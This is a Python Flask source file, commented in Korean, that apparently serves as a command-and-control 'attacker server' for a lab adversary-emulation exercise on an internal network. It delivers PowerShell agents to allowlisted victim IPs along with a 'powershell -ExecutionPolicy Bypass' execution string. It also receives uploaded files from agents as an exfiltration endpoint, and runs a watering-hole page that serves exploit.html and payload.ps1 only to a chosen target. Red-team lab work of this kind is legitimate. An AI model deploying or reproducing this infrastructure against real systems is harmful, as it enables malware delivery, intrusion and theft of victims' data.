from flask import Flask, request, jsonify, send_file, redirect
import os, datetime
from werkzeug.utils import secure_filename
import hashlib

# ========================================
# attacker server 설정
# ========================================
PORT = 34444
ATTACKER_HOST = "192.168.56.1"  # 내부망 기준
app = Flask(__name__)

BASE_DIR = "/home/swlab/attack_server"
AGENT_DIR = os.path.join(BASE_DIR, "agents")
LOG_FILE = os.path.join(BASE_DIR, "logs/access.log")
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")



# ========================================
# TTPs2 설정
# ========================================
TARGET_IP_ALLOWLIST = {"192.168.56.120"}  # ttps2 피해자 IP
DEFAULT_AGENT = "sandcat.ps1"
TTPS2_AGENT = "sandcat_ttps2.ps1"

# ========================================
# TTPs6 설정
# ========================================
WATERING_HOLE_TARGET = "192.168.56.145"  # 워터링홀 타겟
WATERING_HOLE_DIR = os.path.join(BASE_DIR, "watering_hole")
os.makedirs(WATERING_HOLE_DIR, exist_ok=True)

# ========================================
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

def log_event(text: str):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now().isoformat()}] {text}\n")

def sha256sum(data: bytes):
    h = hashlib.sha256()
    h.update(data)
    return h.hexdigest()

def get_client_ip():
    """
    실습망에선 보통 request.remote_addr만으로 충분.
    (리버스 프록시 쓰면 X-Forwarded-For를 추가로 고려)
    """
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or "unknown"

def pick_agent_for_ip(client_ip: str):
    """
    표적 IP면 ttps2용 agent, 아니면 기본 agent(또는 차단).
    """
    if client_ip in TARGET_IP_ALLOWLIST:
        return TTPS2_AGENT
    return DEFAULT_AGENT

@app.route("/")
def home():
    return "Attacker Server Running"

@app.route("/health")
def health():
    return jsonify({"status": "ok", "time": datetime.datetime.now().isoformat()})

@app.route("/login", methods=["GET", "POST"])
def login_trigger():
    client_ip = get_client_ip()

    if request.method == "POST":
        user = request.form.get("user", "")
    else:
        user = request.args.get("user", "")

    agent_name = pick_agent_for_ip(client_ip)

    log_event(f"[LOGIN] ip={client_ip} user={user} selected_agent={agent_name}")

    # 선택된 agent에 따라 다운로드 URL을 바꿔줌
    download_url = f"http://{ATTACKER_HOST}:{PORT}/agents/{agent_name}"

    return jsonify({
        "status": "ok",
        "client_ip": client_ip,
        "selected_agent": agent_name,
        "download_url": download_url,
        # 실행 문자열은 “예시”만 내려주고 실제 ability에서 실행해도 됨
        "execute": f"powershell -ExecutionPolicy Bypass -File {agent_name}"
    })


@app.route("/agents/<path:filename>")
def serve_agent(filename):
    client_ip = get_client_ip()

    # (선택) allowlist 밖이면 ttps2 agent 제공 차단
    if filename == TTPS2_AGENT and client_ip not in TARGET_IP_ALLOWLIST:
        log_event(f"[DENY] ip={client_ip} tried={filename}")
        return "Not found", 404

    file_path = os.path.join(AGENT_DIR, filename)
    if not os.path.exists(file_path):
        log_event(f"[FILE NOT FOUND] ip={client_ip} path={file_path}")
        return "File not found", 404

    log_event(f"[AGENT_DOWNLOAD] ip={client_ip} file={filename}")
    return send_file(file_path, as_attachment=True)

@app.route("/upload", methods=["POST"])
def upload_file():
    client_ip = get_client_ip()
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

    # raw 업로드(-InFile)에서는 form이 비어 있을 수 있으니
    # querystring/헤더도 fallback으로 받게 구성
    agent_id = (
        request.form.get("agent_id")
        or request.args.get("agent_id")
        or request.headers.get("X-Agent-Id")
        or "unknown"
    )
    note = (
        request.form.get("note")
        or request.args.get("note")
        or request.headers.get("X-Note")
        or ""
    )

    # =========================================================
    # CASE 1: multipart/form-data
    # =========================================================
    if "file" in request.files:
        f = request.files["file"]
        if f.filename == "":
            return "Empty filename", 400

        original = secure_filename(f.filename)
        data = f.read()
        sha = sha256sum(data)

        save_name = f"{ts}_{agent_id}_{original}"
        save_path = os.path.join(UPLOAD_DIR, save_name)

        with open(save_path, "wb") as out:
            out.write(data)

        log_event(f"[UPLOAD MULTIPART] ip={client_ip} agent={agent_id} file={save_name} sha256={sha} note={note}")

        return jsonify({"status": "ok", "mode": "multipart", "saved_as": save_name, "sha256": sha})

    # =========================================================
    # CASE 2: raw binary (-InFile)
    # =========================================================
    raw = request.get_data()
    if raw and len(raw) > 0:
        sha = sha256sum(raw)
        save_name = f"{ts}_{agent_id}_raw_upload.bin"
        save_path = os.path.join(UPLOAD_DIR, save_name)

        with open(save_path, "wb") as out:
            out.write(raw)

        log_event(f"[UPLOAD RAW] ip={client_ip} agent={agent_id} file={save_name} sha256={sha} note={note}")

        return jsonify({"status": "ok", "mode": "raw", "saved_as": save_name, "sha256": sha})

    log_event(f"[UPLOAD FAIL] ip={client_ip} agent={agent_id} note={note}")
    return "No file received", 400

# ========================================
# Watering Hole 엔드포인트 추가
# ========================================

@app.route("/notice")
@app.route("/company/notice")
def watering_hole():
    client_ip = get_client_ip()
    log_event(f"[WATERING_HOLE] ip={client_ip}")
    
    if client_ip == WATERING_HOLE_TARGET:
        log_event(f"[WATERING_HOLE] TARGET HIT! ip={client_ip}")
        return send_file(os.path.join(WATERING_HOLE_DIR, "exploit.html"))
    else:
        return send_file(os.path.join(WATERING_HOLE_DIR, "index.html"))


@app.route("/watering_hole/payload.ps1")
def watering_hole_payload():
    client_ip = get_client_ip()
    log_event(f"[WATERING_HOLE_PAYLOAD] ip={client_ip}")
    return send_file(os.path.join(WATERING_HOLE_DIR, "payload.ps1"))


@app.route("/watering_hole/log")
def watering_hole_log():
    client_ip = get_client_ip()
    event = request.args.get("event", "unknown")
    log_event(f"[WATERING_HOLE_EVENT] ip={client_ip} event={event}")
    return "", 204
    
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)